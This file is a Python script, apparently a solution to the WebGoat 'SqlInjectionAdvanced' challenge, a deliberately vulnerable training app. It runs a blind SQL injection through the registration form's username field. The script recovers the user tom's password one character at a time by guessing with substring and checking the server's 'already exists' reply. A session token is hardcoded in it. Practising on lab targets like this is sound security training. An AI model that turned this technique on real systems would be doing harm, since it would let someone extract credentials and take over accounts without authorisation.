#!/usr/bin/env python3
import re
import requests
import sys
import argparse


def iteratePassword(session, counter):
    #tom' and substring(password,1,1)='t
    for letter in text:
        injection = "tom' and substring(password,"+ str(counter) + ",1)='" + letter
        data = {
            'username_reg': injection,
            'email_reg': 'test',
            'password_reg': '12345',
            'confirm_password_reg': '12345'
        }
        result = session.put(
            'http://172.17.0.2:8080/WebGoat/SqlInjectionAdvanced/challenge', data=data, allow_redirects=False)
        # print(result.status_code)
        #print("Trying: " + injection)
        if 'already exists please try to register' in result.text:
            #print(letter)
            return letter


# initialisation of variables
host = 'http://172.17.0.2:8080'
exercise_path = host + '/WebGoat/SqlInjectionAdvanced/challenge'
username = 'anonymvs'
password = '123456'
sessionToken = 'KQXEQAQ3NTnXJZl4bXRemlFX0VTPFJcY9TFFJAem'
text = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
password = ''


# Reading input
parser = argparse.ArgumentParser()
parser.add_argument("--sessionToken", "-s", help="set session token")
args = parser.parse_args()

# Check args

if args.sessionToken:
    print("Set session token " + args.sessionToken)
    sessionToken = args.sessionToken


session = requests.Session()
session.proxies={'http': 'http://localhost:9000'}

login_page = session.get("http://172.17.0.2:8080/WebGoat/login")

dataLogin = {
    'username': 'anonymvs',
    'password': '123456'
}

session.cookies.set('JSESSIONID', sessionToken)

i = 1

while iteratePassword(session,i) is not None:
    password = password + iteratePassword(session, i)
    i = i + 1


print("password is: " + password)
